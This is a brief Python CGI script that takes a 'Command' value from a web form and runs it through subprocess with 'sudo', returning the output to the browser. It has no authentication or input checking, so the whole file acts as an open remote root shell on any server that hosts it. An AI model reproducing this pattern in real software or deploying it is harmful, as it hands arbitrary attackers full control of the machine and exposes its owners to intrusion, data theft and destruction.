#!/usr/bin/python3

import cgi
import subprocess
print("content-type: text/html")
print()

mydata = cgi.FieldStorage()
myx = mydata.getvalue("Command")
output = subprocess.getoutput("sudo " + myx)
print(output)


